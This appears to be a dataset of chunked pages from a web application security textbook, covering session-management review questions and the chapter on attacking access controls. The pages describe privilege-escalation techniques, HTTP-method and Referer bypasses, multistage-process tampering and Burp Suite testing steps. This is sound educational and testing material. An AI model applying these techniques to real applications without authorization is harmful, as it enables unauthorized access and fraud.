    "output": "Stuttard c07.indd V3 - 07/22/2011 Page 255\nChapter 7 n Attacking Session Management 255\nprovides the keys to the kingdom. Jumping into other users’ sessions is good.\nHijacking an administrator’s session is even better; typically this enables you\nto compromise the entire application.\nYou can expect to encounter a wide range of defects in real-world session\nmanagement functionality. When bespoke mechanisms are employed, the\npossible weaknesses and avenues of attack may appear to be endless. The most\nimportant lesson to draw from this topic is to be patient and determined. Quite\na few session management mechanisms that appear to be robust on fi rst inspec-\ntion can be found wanting when analyzed closely. Deciphering the method an\napplication uses to generate its sequence of seemingly random tokens may take\ntime and ingenuity. But given the reward, this is usually an investment well\nworth making.\nQuestions\nAnswers can be found at http://mdsec.net/wahh.\n1. You log in to an application, and the server sets the following cookie:\nSet-cookie: sessid=amltMjM6MTI0MToxMTk0ODcwODYz;\nAn hour later, you log in again and receive the following:\nSet-cookie: sessid=amltMjM6MTI0MToxMTk0ODc1MTMy;\nWhat can you deduce about these cookies?\n2. An application employs six-character alphanumeric session tokens and\nfi ve-character alphanumeric passwords. Both are randomly generated\naccording to an unpredictable algorithm. Which of these is likely to be\nthe more worthwhile target for a brute-force guessing attack? List all the\ndifferent factors that may be relevant to your decision.\n3. You log in to an application at the following URL:\nhttps://foo.wahh-app.com/login/home.php\nand the server sets the following cookie:\nSet-cookie: sessionId=1498172056438227; domain=foo.wahh-\napp.com; path=/login; HttpOnly;\nYou then visit a range of other URLs. To which of the following will your\nbrowser submit the sessionId cookie? (Select all that apply.)\n(a) https://foo.wahh-app.com/login/myaccount.php\n(b) https://bar.wahh-app.com/login\n(c) https://staging.foo.wahh-app.com/login/home.php\n(d) http://foo.wahh-app.com/login/myaccount.php\ncc0077..iinndddd 225555 88//1199//22001111 1122::0077::4455 PPMM\nStuttard c07.indd V3 - 07/22/2011 Page 256\n256 Chapter 7 n Attacking Session Management\n(e) http://foo.wahh-app.com/logintest/login.php\n(f) https://foo.wahh-app.com/logout\n(g) https://wahh-app.com/login/\n(h) https://xfoo.wahh-app.com/login/myaccount.php\n4. The application you are targeting uses per-page tokens in addition to the\nprimary session token. If a per-page token is received out of sequence, the\nentire session is invalidated. Suppose that you discover some defect that\nenables you to predict or capture the tokens issued to other users who are\ncurrently accessing the application. Can you hijack their sessions?\n5. You log in to an application, and the server sets the following cookie:\nSet-cookie: sess=ab11298f7eg14;\nWhen you click the logout button, this causes the following client-side\nscript to execute:\ndocument.cookie=”sess=”;\ndocument.location=”/”;\nWhat conclusion would you draw from this behavior?\ncc0077..iinndddd 225566 88//1199//22001111 1122::0077::4455 PPMM"
  },
  {
    "input": "Chapter 8 Attacking Access Controls",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 257\nCHAPTER\n8\nAttacking Access Controls\nWithin the application’s core security mechanisms, access controls are logically\nbuilt on authentication and session management. So far, you have seen how an\napplication can fi rst verify a user’s identity and then confi rm that a particular\nsequence of requests that it receives originated from the same user. The primary\nreason that the application needs to do these things — in terms of security, at\nleast — is because it needs a way to decide whether it should permit a given\nrequest to perform its attempted action or access the resources it is requesting.\nAccess controls are a critical defense mechanism within the application because\nthey are responsible for making these key decisions. When they are defective, an\nattacker can often compromise the entire application, taking control of adminis-\ntrative functionality and accessing sensitive data belonging to every other user.\nAs noted in Chapter 1, broken access controls are among the most commonly\nencountered categories of web application vulnerability, affecting a massive 71\npercent of the applications recently tested by the authors. It is extremely com-\nmon to encounter applications that go to all the trouble of implementing robust\nmechanisms for authentication and session management, only to squander that\ninvestment by neglecting to build effective access controls on them. One reason\nthat these weaknesses are so prevalent is that access control checks need to be\nperformed for every request and every operation on a resource that particular\nuser attempts to perform, at a specifi c time. And unlike many other classes of\ncontrol, this is a design decision that needs to be made by a human; it cannot\nbe resolved by employing technology.\n257\ncc0088..iinndddd 225577 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Common Vulnerabilities",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 258\n258 Chapter 8 n Attacking Access Controls\nAccess control vulnerabilities are conceptually simple: The application lets you\ndo something you shouldn’t be able to. The differences between separate fl aws\nreally come down to the different ways in which this core defect is manifested and\nthe different techniques you need to employ to detect it. This chapter describes all\nthese techniques, showing how you can exploit different kinds of behavior within\nan application to perform unauthorized actions and access protected data.\nCommon Vulnerabilities\nAccess controls can be divided into three broad categories: vertical, horizontal,\nand context-dependent.\nVertical access controls allow different types of users to access different parts\nof the application’s functionality. In the simplest case, this typically involves a\ndivision between ordinary users and administrators. In more complex cases,\nvertical access controls may involve fi ne-grained user roles granting access to\nspecifi c functions, with each user being allocated to a single role, or a combina-\ntion of different roles.\nHorizontal access controls allow users to access a certain subset of a wider\nrange of resources of the same type. For example, a web mail application may\nallow you to read your e-mail but no one else’s, an online bank may let you\ntransfer money out of your account only, and a workfl ow application may allow\nyou to update tasks assigned to you but only read tasks assigned to other people.\nContext-dependent access controls ensure that users’ access is restricted to\nwhat is permitted given the current application state. For example, if a user is\nfollowing multiple stages within a process, context-dependent access controls\nmay prevent the user from accessing stages out of the prescribed order.\nIn many cases, vertical and horizontal access controls are intertwined. For\nexample, an enterprise resource planning application may allow each accounts\npayable clerk to pay invoices for a specifi c organizational unit and no other. The\naccounts payable manager, on the other hand, may be allowed to pay invoices\nfor any unit. Similarly, clerks may be able to pay invoices for small amounts,\nbut larger invoices must be paid by the manager. The fi nance director may be\nable to view invoice payments and receipts for every organizational unit in the\ncompany but may not be permitted to pay any invoices.\nAccess controls are broken if any user can access functionality or resources for\nwhich he or she is not authorized. There are three main types of attacks against\naccess controls, corresponding to the three categories of controls:\nn Vertical privilege escalation occurs when a user can perform functions\nthat his assigned role does not permit him to. For example, if an ordinary\nuser can perform administrative functions, or a clerk can pay invoices of\nany size, access controls are broken.\ncc0088..iinndddd 225588 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Completely Unprotected Functionality",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 259\nChapter 8 n Attacking Access Controls 259\nn Horizontal privilege escalation occurs when a user can view or modify\nresources to which he is not entitled. For example, if you can use a web\nmail application to read other people’s e-mail, or if a payment clerk can\nprocess invoices for an organizational unit other than his own, access\ncontrols are broken.\nn Business logic exploitation occurs when a user can exploit a fl aw in the\napplication’s state machine to gain access to a key resource. For example,\na user may be able to bypass the payment step in a shopping checkout\nsequence.\nIt is common to fi nd cases where vulnerability in the application’s horizontal\nseparation of privileges can lead immediately to a vertical escalation attack. For\nexample, if a user fi nds a way to set a different user’s password, the user can\nattack an administrative account and take control of the application.\nIn the cases described so far, broken access controls enable users who have\nauthenticated themselves to the application in a particular user context to per-\nform actions or access data for which that context does not authorize them.\nHowever, in the most serious cases of broken access control, it may be possible\nfor completely unauthorized users to gain access to functionality or data that\nis intended to be accessed only by privileged authenticated users.\nCompletely Unprotected Functionality\nIn many cases of broken access controls, sensitive functionality and resources\ncan be accessed by anyone who knows the relevant URL. For example, with\nmany applications, anyone who visits a specifi c URL can make full use of its\nadministrative functions:\nhttps://wahh-app.com/admin/\nIn this situation, the application typically enforces access control only to the\nfollowing extent: users who have logged in as administrators see a link to this\nURL on their user interface, and other users do not. This cosmetic difference\nis the only mechanism in place to “protect” the sensitive functionality from\nunauthorized use.\nSometimes, the URL that grants access to powerful functions may be less\neasy to guess, and may even be quite cryptic:\nhttps://wahh-app.com/menus/secure/ff457/DoAdminMenu2.jsp\nHere, access to administrative functions is protected by the assumption that\nan attacker will not know or discover this URL. The application is harder for\nan outsider to compromise, because he is less likely to guess the URL by which\nhe can do so.\ncc0088..iinndddd 225599 88//1199//22001111 1122::0088::3311 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 260\n260 Chapter 8 n Attacking Access Controls\nCOMMON MYTH\n“No low-privileged users will know that URL. We don’t reference it anywhere\nwithin the application.”\nThe absence of any genuine access control still constitutes a serious vulner-\nability, regardless of how easy it would be to guess the URL. URLs do not have\nthe status of secrets, either within the application itself or in the hands of\nits users. They are displayed on-screen, and they appear in browser histories\nand the logs of web servers and proxy servers. Users may write them down,\nbookmark them, or e-mail them. They are not usually changed periodically, as\npasswords should be. When users change job roles, and their access to admin-\nistrative functionality needs to be withdrawn, there is no way to delete their\nknowledge of a particular URL.\nIn some applications where sensitive functionality is hidden behind URLs\nthat are not easy to guess, an attacker may often be able to identify these via\nclose inspection of client-side code. Many applications use JavaScript to build\nthe user interface dynamically within the client. This typically works by setting\nvarious fl ags regarding the user’s status and then adding individual elements\nto the UI on the basis of these:\nvar isAdmin = false;\n...\nif (isAdmin)\n{\nadminMenu.addItem(“/menus/secure/ff457/addNewPortalUser2.jsp”,\n“create a new user”);\n}\nHere, an attacker can simply review the JavaScript to identify URLs for\nadministrative functionality and attempt to access these. In other cases, HTML\ncomments may contain references to or clues about URLs that are not linked\nfrom on-screen content. Chapter 4 discusses the various techniques by which\nan attacker can gather information about hidden content within the application.\nDirect Access to Methods\nA specifi c case of unprotected functionality can arise when applications expose\nURLs or parameters that are actually remote invocations of API methods, normally\nthose exposed by a Java interface. This often occurs when server-side code is\nmoved to a browser extension component and method stubs are created so that\nthe code can still call the server-side methods it requires to function. Outside\nof this situation, some instances of direct access to methods can be identifi ed\nwhere URLs or parameters use the standard Java naming conventions, such as\ngetBalance and isExpired.\ncc0088..iinndddd 226600 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Identifier-Based Functions",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 261\nChapter 8 n Attacking Access Controls 261\nIn principle, requests specifying a server-side API to be executed need be\nno less secure than those specifying a server-side script or other resource. In\npractice, however, this type of mechanism frequently contains vulnerabilities.\nOften, the client interacts directly with server-side API methods and bypasses\nthe application’s normal controls over access or unexpected input vectors. There\nis also a chance that other functionality exists that can be invoked in this way\nand is not protected by any controls, on the assumption that it could never be\ndirectly invoked by web application clients. Often, there is a need to provide\nusers with access to certain specifi c methods, but they are instead given access\nto all methods. This is either because the developer is not fully aware of which\nsubset of methods to proxy and provides access to all methods, or because the API\nused to map them to the HTTP server provides access to all methods by default.\nThe following example shows the getCurrentUserRoles method being invoked\nfrom within the interface securityCheck:\nhttp://wahh-app.com/public/securityCheck/getCurrentUserRoles\nIn this example, in addition to testing the access controls over the getCur-\nrentUserRoles method, you should check for the existence of other similarly\nnamed methods such as getAllUserRoles, getAllRoles, getAllUsers, and\ngetCurrentUserPermissions. Further considerations specifi c to the testing of\ndirect access to methods are described later in this chapter.\nIdentifi er-Based Functions\nWhen a function of an application is used to gain access to a specifi c resource,\nit is common to see an identifi er for the requested resource being passed to the\nserver in a request parameter, within either the URL query string or the body\nof a POST request. For example, an application may use the following URL to\ndisplay a specifi c document belonging to a particular user:\nhttps://wahh-app.com/ViewDocument.php?docid=1280149120\nWhen the user who owns the document is logged in, a link to this URL is\ndisplayed on the user’s My Documents page. Other users do not see the link.\nHowever, if access controls are broken, any user who requests the relevant URL\nmay be able to view the document in exactly the same way as the authorized user.\nTIP This type of vulnerability often arises when the main application inter-\nfaces with an external system or back-end component. It can be diffi cult to\nshare a session-based security model between different systems that may be\nbased on diverse technologies. Faced with this problem, developers frequently\ntake a shortcut and move away from that model, using client-submitted\nparameters to make access control decisions.\ncc0088..iinndddd 226611 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Multistage Functions",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 262\n262 Chapter 8 n Attacking Access Controls\nIn this example, an attacker seeking to gain unauthorized access needs to\nknow not only the name of the application page (ViewDocument.php) but also\nthe identifi er of the document he wants to view. Sometimes, resource identi-\nfi ers are generated in a highly unpredictable manner; for example, they may\nbe randomly chosen GUIDs. In other cases, they may be easily guessed; for\nexample, they may be sequentially generated numbers. However, the applica-\ntion is vulnerable in both cases. As described previously, URLs do not have the\nstatus of secrets, and the same applies to resource identifi ers. Often, an attacker\nwho wants to discover the identifi ers of other users’ resources can fi nd some\nlocation within the application that discloses these, such as access logs. Even\nwhere an application’s resource identifi ers cannot be easily guessed, the appli-\ncation is still vulnerable if it fails to properly control access to those resources.\nIn cases where the identifi ers are easily predicted, the problem is even more\nserious and more easily exploited.\nTIP Application logs are often a gold mine of information. They may contain\nnumerous items of data that can be used as identifi ers to probe functionality\nthat is accessed in this way. Identifi ers commonly found within application\nlogs include usernames, user ID numbers, account numbers, document IDs,\nuser groups and roles, and e-mail addresses.\nNOTE In addition to being used as references to data-based resources within\nthe application, this kind of identifi er is often used to refer to functions of the\napplication itself. As you saw in Chapter 4, an application may deliver differ-\nent functions via a single page, which accepts a function name or identifi er as\na parameter. Again in this situation, access controls may run no deeper than\nthe presence or absence of specifi c URLs within the interfaces of different\ntypes of users. If an attacker can determine the identifi er for a sensitive func-\ntion, he may be able to access it in the same way as a more privileged user.\nMultistage Functions\nMany kinds of functions within an application are implemented across several\nstages, involving multiple requests being sent from the client to the server. For\nexample, a function to add a new user may involve choosing this option from\na user maintenance menu, selecting the department and user role from drop-\ndown lists, and then entering the new username, initial password, and other\ninformation.\nIt is common to encounter applications in which efforts have been made to\nprotect this kind of sensitive functionality from unauthorized access but where\nthe access controls employed are broken because of fl awed assumptions about\nhow the functionality will be used.\ncc0088..iinndddd 226622 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Static Files",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 263\nChapter 8 n Attacking Access Controls 263\nIn the previous example, when a user attempts to load the user maintenance\nmenu and chooses the option to add a new user, the application may verify\nthat the user has the required privileges and block access if the user does not.\nHowever, if an attacker proceeds directly to the stage of specifying the user’s\ndepartment and other details, there may be no effective access control. The\ndevelopers unconsciously assumed that any user who reaches the later stages\nof the process must have the relevant privileges because this was verifi ed at\nthe earlier stages. The result is that any user of the application can add a new\nadministrative user account and thereby take full control of the application, gain-\ning access to many other functions whose access control is intrinsically robust.\nThe authors have encountered this type of vulnerability even in the most\nsecurity-critical web applications — those deployed by online banks. Making a\nfunds transfer in a banking application typically involves multiple stages, partly\nto prevent users from accidentally making mistakes when requesting a transfer.\nThis multistage process involves capturing different items of data from the user\nat each stage. This data is checked thoroughly when fi rst submitted and then\nusually is passed to each subsequent stage, using hidden fi elds in HTML form.\nHowever, if the application does not revalidate all this data at the fi nal stage,\nan attacker can potentially bypass the server’s checks. For example, the appli-\ncation might verify that the source account selected for the transfer belongs to\nthe current user and then ask for details about the destination account and the\namount of the transfer. If a user intercepts the fi nal POST request of this process\nand modifi es the source account number, she can execute a horizontal privilege\nescalation and transfer funds out of an account belonging to a different user.\nStatic Files\nIn the majority of cases, users gain access to protected functionality and resources\nby issuing requests to dynamic pages that execute on the server. It is the responsi-\nbility of each such page to perform suitable access control checks and confi rm that\nthe user has the relevant privileges to perform the action he or she is attempting.\nHowever, in some cases, requests for protected resources are made directly to\nthe static resources themselves, which are located within the server’s web root.\nFor example, an online publisher may allow users to browse its book catalog\nand purchase ebooks for download. Once payment has been made, the user is\ndirected to a download URL like the following:\nhttps://wahh-books.com/download/9780636628104.pdf\nBecause this is a completely static resource, if it is hosted on a traditional web\nserver, its contents are simply returned directly by the server, and no application-\nlevel code is executed. Hence, the resource cannot implement any logic to verify\ncc0088..iinndddd 226633 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Platform Misconfiguration",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 264\n264 Chapter 8 n Attacking Access Controls\nthat the requesting user has the required privileges. When static resources are\naccessed in this way, it is highly likely that no effective access controls are pro-\ntecting them and that anyone who knows the URL naming scheme can exploit\nthis to access any resources he wants. In the present case, the document name\nlooks suspiciously like an ISBN, which would enable an attacker to quickly\ndownload every ebook produced by the publisher!\nCertain types of functionality are particularly prone to this kind of prob-\nlem, including fi nancial websites providing access to static documents about\ncompanies such as annual reports, software vendors that provide downloadable\nbinaries, and administrative functionality that provides access to static log fi les\nand other sensitive data collected within the application.\nPlatform Misconfi guration\nSome applications use controls at the web server or application platform layer\nto control access. Typically, access to specifi ed URL paths is restricted based on\nthe user’s role within the application. For example, access to the /admin path\nmay be denied to users who are not in the Administrators group. In principle,\nthis is an entirely legitimate means of controlling access. However, mistakes\nmade in the confi guration of the platform-level controls can often allow unau-\nthorized access to occur.\nThe platform-level confi guration normally takes the form of rules that are\nakin to fi rewall policy rules, which allow or deny access based on the following:\nn HTTP request method\nn URL path\nn User role\nAs described in Chapter 3, the original purpose of the GET method is of retriev-\ning information, and the purpose of the POST method is performing actions that\nchange the application’s data or state.\nIf care is not taken to devise rules that accurately allow access based on the\ncorrect HTTP methods and URL paths, this may lead to unauthorized access.\nFor example, if an administrative function to create a new user uses the POST\nmethod, the platform may have a deny rule that disallows the POST method\nand allows all other methods. However, if the application-level code does not\nverify that all requests for this function are in fact using the POST method, an\nattacker may be able to circumvent the control by submitting the same request\nusing the GET method. Since most application-level APIs for retrieving request\nparameters are agnostic as to the request method, the attacker can simply sup-\nply the required parameters within the URL query string of the GET request to\nmake unauthorized use of the function.\ncc0088..iinndddd 226644 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Insecure Access Control Methods",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 265\nChapter 8 n Attacking Access Controls 265\nWhat is more surprising, on the face of it, is that applications can still be\nvulnerable even if the platform-level rule denies access to both the GET and\nPOST methods. This happens because requests using other HTTP methods may\nultimately be handled by the same application code that handles GET and POST\nrequests. One example of this is the HEAD method. According to specifi cations,\nservers should respond to a HEAD request with the same headers they would use\nto respond to the corresponding GET request, but with no message body. Hence,\nmost platforms correctly service HEAD requests by executing the corresponding\nGET handler and just return the HTTP headers that are generated. GET requests\ncan often be used to perform sensitive actions, either because the application\nitself uses GET requests for this purpose (contrary to specifi cations) or because\nit does not verify that the POST method is being used. If an attacker can use a\nHEAD request to add an administrative user account, he or she can live without\nreceiving any message body in the response.\nIn some cases, platforms handle requests that use unrecognized HTTP methods\nby simply passing them to the GET request handler. In this situation, platform-\nlevel controls that just deny certain specifi ed HTTP methods can be bypassed\nby specifying an arbitrary invalid HTTP method in the request.\nChapter 18 contains a specifi c example of this type of vulnerability arising\nin a web application platform product.\nInsecure Access Control Methods\nSome applications employ a fundamentally insecure access control model in\nwhich access control decisions are made on the basis of request parameters\nsubmitted by the client, or other conditions that are within an attacker’s control.\nParameter-Based Access Control\nIn some versions of this model, the application determines a user’s role or access\nlevel at the time of login and from this point onward transmits this information\nvia the client in a hidden form fi eld, cookie, or preset query string parameter (see\nChapter 5). When each subsequent request is processed, the application reads\nthis request parameter and decides what access to grant the user accordingly.\nFor example, an administrator using the application may see URLs like the\nfollowing:\nhttps://wahh-app.com/login/home.jsp?admin=true\nThe URLs seen by ordinary users contain a different parameter, or none at all.\nAny user who is aware of the parameter assigned to administrators can simply\nset it in his own requests and thereby gain access to administrative functions.\ncc0088..iinndddd 226655 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Attacking Access Controls",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 266\n266 Chapter 8 n Attacking Access Controls\nThis type of access control may sometimes be diffi cult to detect without\nactually using the application as a high-privileged user and identifying what\nrequests are made. The techniques described in Chapter 4 for discovering hid-\nden request parameters may be successful in discovering the mechanism when\nworking only as an ordinary user.\nReferer-Based Access Control\nIn other unsafe access control models, the application uses the HTTP Referer\nheader as the basis for making access control decisions. For example, an appli-\ncation may strictly control access to the main administrative menu based on\na user’s privileges. But when a user makes a request for an individual admin-\nistrative function, the application may simply check whether this request was\nreferred from the administrative menu page. It might assume that the user must\nhave accessed that page and therefore has the required privileges. This model\nis fundamentally broken, of course, because the Referer header is completely\nunder the user’s control and can be set to any value.\nLocation-Based Access Control\nMany businesses have a regulatory or business requirement to restrict access to\nresources depending on the user’s geographic location. These are not limited\nto the fi nancial sector but include news services and others. In these situations,\na company may employ various methods to locate the user, the most common\nof which is geolocation of the user’s current IP address.\nLocation-based access controls are relatively easy for an attacker to circum-\nvent. Here are some common methods of bypassing them:\nn Using a web proxy that is based in the required location\nn Using a VPN that terminates in the required location\nn Using a mobile device that supports data roaming\nn Direct manipulation of client-side mechanisms for geolocation\nAttacking Access Controls\nBefore starting to probe the application to detect any actual access control\nvulnerabilities, you should take a moment to review the results of your appli-\ncation mapping exercises (see Chapter 4). You need to understand what the\napplication’s actual requirements are in terms of access control, and therefore\nwhere it will probably be most fruitful to focus your attention.\ncc0088..iinndddd 226666 88//1199//22001111 1122::0088::3311 PPMM"
  },
  {
    "input": "Testing with Different User Accounts",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 267\nChapter 8 n Attacking Access Controls 267\nHACK STEPS\nHere are some questions to consider when examining an application’s access\ncontrols:\n1. Do application functions give individual users access to a particular\nsubset of data that belongs to them?\n2. Are there different levels of user, such as managers, supervisors, guests,\nand so on, who are granted access to different functions?\n3. Do administrators use functionality that is built into the same application\nto configure and monitor it?\n4. What functions or data resources within the application have you identi-\nfied that would most likely enable you to escalate your current privileges?\n5. Are there any identifiers (by way of URL parameters of POST body mes-\nsage) that signal a parameter is being used to track access levels?\nTesting with Different User Accounts\nThe easiest and most effective way to test the effectiveness of an application’s\naccess controls is to access the application using different accounts. That way\nyou can determine whether resources and functionality that can be accessed\nlegitimately by one account can be accessed illegitimately by another.\nHACK STEPS\n1. If the application segregates user access to different levels of functional-\nity, first use a powerful account to locate all the available functionality.\nThen attempt to access this using a lower-privileged account to test for\nvertical privilege escalation.\n2. If the application segregates user access to different resources (such as\ndocuments), use two different user-level accounts to test whether access\ncontrols are effective or whether horizontal privilege escalation is pos-\nsible. For example, find a document that can be legitimately accessed by\none user but not by another, and attempt to access it using the second\nuser’s account — either by requesting the relevant URL or by submitting\nthe same POST parameters from within the second user’s session.\nTesting an application’s access controls thoroughly is a time-consuming\nprocess. Fortunately, some tools can help you automate some of the work involved,\nto make your testing quicker and more reliable. This will allow you to focus\non the parts of the task that require human intelligence to perform effectively.\ncc0088..iinndddd 226677 88//1199//22001111 1122::0088::3322 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 268\n268 Chapter 8 n Attacking Access Controls\nBurp Suite lets you map the contents of an application using two different\nuser contexts. Then you can compare the results to see exactly where the content\naccessed by each user is the same or different.\nHACK STEPS\n1. With Burp configured as your proxy and interception disabled, browse all\nthe application’s content within one user context. If you are testing verti-\ncal access controls, use the higher-privilege account for this.\n2. Review the contents of Burp’s site map to ensure that you have identified\nall the functionality you want to test. Then use the context menu to select\nthe “compare site maps” feature.\n3. To select the second site map to be compared, you can either load this\nfrom a Burp state file or have Burp dynamically rerequest the first site\nmap in a new session context. To test horizontal access controls between\nusers of the same type, you can simply load a state file you saved earlier,\nhaving mapped the application as a different user. For testing vertical\naccess controls, it is preferable to rerequest the high-privilege site map as\na low-privileged user, because this ensures complete coverage of the\nrelevant functionality.\n4. To rerequest the first site map in a different session, you need to configure\nBurp’s session-handling functionality with the details of the low-privilege\nuser session (for example, by recording a login macro or providing a\nspecific cookie to be used in requests). This feature is described in more\ndetail in Chapter 14. You may also need to define suitable scope rules to\nprevent Burp from requesting any logout function.\nFigure 8-1 shows the results of a simple site map comparison. Its colorized\nanalysis of the differences between the site maps shows items that have been\nadded, removed, or modifi ed between the two maps. For modifi ed items, the\ntable includes a “diff count” column, which is the number of edits required to\nmodify the item in the fi rst map into the item in the second map. Also, when an\nitem is selected, the responses are also colorized to show the locations of those\nedits within the responses.\nInterpreting the results of the site map comparison requires human intelli-\ngence and an understanding of the meaning and context of specifi c application\nfunctions. For example, Figure 8-1 shows the responses that are returned to\neach user when they view their home page. The two responses show a different\ndescription of the logged-in user, and the administrative user has an additional\nmenu item. These differences are to be expected, and they are neutral as to the\neffectiveness of the application’s access controls, since they concern only\nthe user interface.\ncc0088..iinndddd 226688 88//1199//22001111 1122::0088::3322 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 269\nChapter 8 n Attacking Access Controls 269\nFigure 8-1: A site map comparison showing the differences between content that\nwas accessed in different user contexts\nFigure 8-2 shows the response returned when each user requests the top-level\nadmin page. Here, the administrative user sees a menu of available options, while\nthe ordinary user sees a “not authorized” message. These differences indicate\nthat access controls are being applied correctly. Figure 8-3 shows the response\nreturned when each user requests the “list users” admin function. Here, the\nresponses are identical, indicating that the application is vulnerable, since the\nordinary user should not have access to this function and does not have any\nlink to it in his or her user interface.\nSimply exploring the site map tree and looking at the number of differences\nbetween items is insuffi cient to evaluate the effectiveness of the application’s\naccess controls. Two identical responses may indicate a vulnerability (for example,\nin an administrative function that discloses sensitive information) or may be\nharmless (for example, in an unprotected search function). Conversely, two dif-\nferent responses may still mean that a vulnerability exists (for example, in an\nadministrative function that returns different content each time it is accessed)\nor may be harmless (for example, in a page showing profi le information about\nthe currently logged-in user). For these reasons, fully automated tools gener-\nally are ineffective at identifying access control vulnerabilities. Using Burp’s\nfunctionality to compare site maps, you can automate as much of the process\nas possible, giving you all the information you need in a ready form, and let-\nting you apply your knowledge of the application’s functionality to identify any\nactual vulnerabilities.\ncc0088..iinndddd 226699 88//1199//22001111 1122::0088::3322 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 270\n270 Chapter 8 n Attacking Access Controls\nFigure 8-2: The low-privileged user is denied access to the top-level admin page\nFigure 8-3: The low-privileged user can access the administrative function to list\napplication users\ncc0088..iinndddd 227700 88//1199//22001111 1122::0088::3322 PPMM"
  },
  {
    "input": "Testing Multistage Processes",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 271\nChapter 8 n Attacking Access Controls 271\nTRY IT!\nhttp://mdsec.net/auth/462/\nhttp://mdsec.net/auth/468/\nTesting Multistage Processes\nThe approach described in the preceding section — comparing the appli-\ncation’s contents when accessed in different user contexts — is ineffective\nwhen testing some multistage processes. Here, to perform an action, the\nuser typically must make several requests in the correct sequence, with the\napplication building some state about the user’s actions as he or she does so.\nSimply rerequesting each of the items in a site map may fail to replicate the\nprocess correctly, so the attempted action may fail for reasons other than\nthe use of access controls.\nFor example, consider an administrative function to add a new application\nuser. This may involve several steps, including loading the form to add a user,\nsubmitting the form with details of the new user, reviewing these details, and\nconfi rming the action. In some cases, the application may protect access to the\ninitial form but fail to protect the page that handles the form submission or\nthe confi rmation page. The overall process may involve numerous requests,\nincluding redirections, with parameters submitted at earlier stages being\nretransmitted later via the client side. Every step of this process needs to\nbe tested individually, to confi rm whether access controls are being applied\ncorrectly.\nTRY IT!\nhttp://mdsec.net/auth/471/\nHACK STEPS\n1. When an action is carried out in a multistep way, involving several different\nrequests from client to server, test each request individually to determine\nwhether access controls have been applied to it. Be sure to include every\nrequest, including form submissions, the following of redirections, and any\nunparameterized requests.\n2. Try to find any locations where the application effectively assumes that if\nyou have reached a particular point, you must have arrived via legitimate\nmeans. Try to reach that point in other ways using a lower-privileged\naccount to detect if any privilege escalation attacks are possible.\nContinued\ncc0088..iinndddd 227711 88//1199//22001111 1122::0088::3333 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 272\n272 Chapter 8 n Attacking Access Controls\nHACK STEPS (CONTINUED)\n3. One way to perform this testing manually is to walk through a protected\nmultistage process several times in your browser and use your proxy to\nswitch the session token supplied in different requests to that of a\nless-privileged user.\n4. You can often dramatically speed up this process by using the “request in\nbrowser” feature of Burp Suite:\na. Use the higher-privileged account to walk through the entire multi-\nstage process.\nb. Log in to the application using the lower-privileged account (or none\nat all).\nc. In the Burp Proxy history, find the sequence of requests that were\nmade when the multistage process was performed as a more privi-\nleged user. For each request in the sequence, select the context menu\nitem “request in browser in current browser session,” as shown in\nFigure 8-4. Paste the provided URL into your browser that is logged in\nas the lower-privileged user.\nd. If the application lets you, follow through the remainder of the\nmulti-stage process in the normal way, using your browser.\ne. View the result within both the browser and the proxy history to\ndetermine whether it successfully performed the privileged action.\nFigure 8-4: Using Burp to request a given item within the current browser session\ncc0088..iinndddd 227722 88//1199//22001111 1122::0088::3333 PPMM"
  },
  {
    "input": "Testing with Limited Access",
    "output": "Stuttard c08.indd V3 - 07/28/2011 Page 273\nChapter 8 n Attacking Access Controls 273\nWhen you select Burp’s “request in browser in current browser session”\nfeature for a specifi ed request, Burp gives you a unique URL targeting Burp’s\ninternal web server, which you paste into your browser’s address bar. When\nyour browser requests this URL, Burp returns a redirection to the originally\nspecifi ed URL. When your browser follows the redirection, Burp replaces the\nrequest with the one you originally specifi ed, while leaving the Cookie header\nintact. If you are testing different user contexts, you can speed up this process.\nLog in to several different browsers as different users, and paste the URL into\neach browser to see how the request is handled for the user who is logged in\nusing that browser. (Note that because cookies generally are shared between\ndifferent windows of the same browser, you normally will need to use differ-\nent browser products, or browsers on different machines, to perform this test.)\nTIP When you are testing multistage processes in different user contexts, it\nis sometimes helpful to review the sequences of requests that are made by\ndifferent users side-by-side to identify subtle differences that may merit\nfurther investigation.\nIf you are using separate browsers to access the application as different users,\nyou can create a different proxy listener in Burp for use by each browser (you\nneed to update your proxy confi guration in each browser to point to the rel-\nevant listener). Then, for each browser, use the context menu on the proxy\nhistory to open a new history window, and set a display fi lter to show only\nrequests from the relevant proxy listener.\nTesting with Limited Access\nIf you have only one user-level account with which to access the application (or\nnone at all), additional work needs to be done to test the effectiveness of access\ncontrols. In fact, to perform a fully comprehensive test, further work needs to\nbe done in any case. Poorly protected functionality may exist that is not explic-\nitly linked from the interface of any application user. For example, perhaps old\nfunctionality has not yet been removed, or new functionality has been deployed\nbut has not yet been published to users.\nHACK STEPS\n1. Use the content discovery techniques described in Chapter 4 to identify\nas much of the application’s functionality as possible. Performing this\nexercise as a low-privileged user is often sufficient to both enumerate and\ngain direct access to sensitive functionality.\nContinued\ncc0088..iinndddd 227733 88//1199//22001111 1122::0088::3333 PPMM\nStuttard c08.indd V3 - 07/28/2011 Page 274\n274 Chapter 8 n Attacking Access Controls\nHACK STEPS (CONTINUED)\n2. Where application pages are identified that 